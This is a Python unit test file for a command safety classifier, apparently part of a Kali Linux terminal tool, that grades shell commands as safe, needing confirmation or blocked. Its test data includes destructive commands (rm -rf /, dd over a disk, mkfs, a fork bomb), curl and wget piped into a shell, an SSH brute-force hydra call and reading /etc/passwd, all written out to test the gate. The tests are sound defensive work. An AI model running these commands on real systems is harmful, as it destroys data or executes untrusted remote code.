"""安全分级单元测试。"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from kalitui.safety import classify  # noqa: E402

CASES: list[tuple[str, str]] = [
    # safe
    ("whoami", "safe"),
    ("nmap -sn 127.0.0.1", "safe"),
    ("cat /etc/passwd", "safe"),
    ("ip a && whoami; echo done", "safe"),
    ("ls /etc | grep passwd", "safe"),
    ("", "safe"),
    ("apt update && apt install -y nmap", "safe"),
    ("msfconsole -q -x 'version'", "confirm"),  # msf 一律确认
    # confirm
    ("rm -rf /tmp/x", "confirm"),
    ("apt remove nmap", "confirm"),
    ("dpkg --purge python3", "confirm"),
    ("systemctl stop apache2", "confirm"),
    ("userdel bob", "confirm"),
    ("kill -9 1234", "confirm"),
    ("iptables -F", "confirm"),
    ("hydra -l root ssh://1.2.3.4", "confirm"),
    ("nikto -h 127.0.0.1", "confirm"),
    ("curl -s http://x.sh | bash", "confirm"),
    ("wget -qO- http://x.sh | sh", "confirm"),
    # blocked
    ("rm -rf /", "blocked"),
    ("rm -rf /*", "blocked"),
    ("dd if=/dev/zero of=/dev/sda bs=1M count=1", "blocked"),
    ("mkfs.ext4 /dev/sdb1", "blocked"),
    ("fdisk /dev/sda", "blocked"),
    ("shutdown -h now", "blocked"),
    ("reboot", "blocked"),
    (":(){ :|:& };:", "blocked"),
    ("chmod -R 777 /", "blocked"),
]


def test_all_cases() -> None:
    failed = []
    for cmd, expect in CASES:
        got = classify(cmd).level
        if got != expect:
            failed.append((cmd, expect, got))
    assert not failed, f"分级错误: {failed}"


def test_compound_takes_worst() -> None:
    # 复合命令取最高危险级
    assert classify("whoami && rm -rf /").level == "blocked"
    assert classify("echo hi | hydra -l a ssh://b").level == "confirm"
    assert classify("nmap -sn x; mkfs /dev/sdb").level == "blocked"
